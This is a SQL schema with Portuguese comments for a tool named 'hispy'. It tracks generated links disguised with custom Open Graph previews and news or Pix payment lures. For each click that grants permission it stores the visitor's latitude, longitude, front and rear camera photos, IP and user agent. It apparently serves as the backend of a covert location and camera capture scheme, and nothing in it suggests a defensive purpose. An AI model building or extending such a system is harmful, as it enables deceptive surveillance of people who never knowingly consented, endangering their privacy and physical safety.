-- Investigações: cada link gerado = uma investigação
CREATE TABLE ops_hispy_investigations (
  id            uuid        DEFAULT gen_random_uuid() PRIMARY KEY,
  nome          text        NOT NULL,
  slug          text        NOT NULL UNIQUE,
  tipo          text        NOT NULL DEFAULT 'reportagem', -- 'reportagem' | 'pix'
  og_titulo     text,
  og_descricao  text,
  og_imagem_url text,
  created_by    uuid,
  created_at    timestamptz DEFAULT now(),
  status        text        DEFAULT 'ativa' -- 'ativa' | 'encerrada'
);

-- Capturas: cada clique que resultou em permissão concedida
CREATE TABLE ops_hispy_captures (
  id                uuid        DEFAULT gen_random_uuid() PRIMARY KEY,
  investigation_id  uuid        NOT NULL REFERENCES ops_hispy_investigations(id) ON DELETE CASCADE,
  captured_at       timestamptz DEFAULT now(),
  latitude          double precision,
  longitude         double precision,
  accuracy          double precision,
  foto_frente_url   text,
  foto_traseira_url text,
  user_agent        text,
  ip                text
);

CREATE INDEX ON ops_hispy_captures (investigation_id);
